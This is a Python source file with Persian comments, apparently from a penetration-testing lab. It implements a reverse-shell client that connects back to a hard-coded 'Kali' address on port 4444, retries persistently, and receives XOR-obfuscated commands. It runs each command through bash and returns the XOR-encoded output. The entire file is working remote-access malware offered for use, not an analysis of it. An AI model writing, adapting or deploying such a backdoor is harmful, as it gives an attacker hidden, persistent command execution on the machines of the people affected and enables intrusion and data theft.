# ubuntu_client_simple.py
import socket
import subprocess
import os

XOR_KEY = 0x41  # کلید باید مثل سرور باشد

def xor_encrypt(data):
    return bytes([b ^ XOR_KEY for b in data])

def xor_decrypt(data):
    return bytes([b ^ XOR_KEY for b in data])

def run_command(cmd):
    """اجرای دستور و برگرداندن خروجی"""
    try:
        # دستور cd
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            os.chdir(path)
            return f"Directory changed to: {os.getcwd()}"
        
        # اجرای سایر دستورات
        result = subprocess.run(
            cmd,
            shell=True,
            executable='/bin/bash',
            capture_output=True,
            text=True
        )
        
        if result.stdout:
            return result.stdout
        elif result.stderr:
            return result.stderr
        else:
            return "Command executed (no output)"
            
    except Exception as e:
        return f"Error: {str(e)}"

def connect_to_kali():
    kali_ip = "192.168.253.129"
    kali_port = 4444
    
    print(f"[*] Connecting to {kali_ip}:{kali_port}...")
    
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((kali_ip, kali_port))
            print("[+] Connected to Kali!")
            
            while True:
                # دریافت دستور
                data = b""
                while True:
                    chunk = client.recv(1)
                    if chunk == b'\n' or not chunk:
                        break
                    data += chunk
                
                if not data:
                    print("[-] Connection lost")
                    break
                
                # رمزگشایی دستور
                command = xor_decrypt(data).decode()
                print(f"[+] Received command: {command}")
                
                if command.lower() == "exit":
                    print("[*] Exit command received")
                    break
                
                # اجرای دستور
                output = run_command(command)
                
                # رمزنگاری و ارسال پاسخ
                encrypted_output = xor_encrypt(output.encode())
                client.sendall(encrypted_output + b'\n')
        
        except ConnectionRefusedError:
            print("[-] Connection refused, retrying in 5 seconds...")
            import time
            time.sleep(5)
            continue
            
        except Exception as e:
            print(f"[-] Error: {e}")
            print("[*] Reconnecting in 10 seconds...")
            import time
            time.sleep(10)
            continue

if __name__ == "__main__":
    connect_to_kali()

    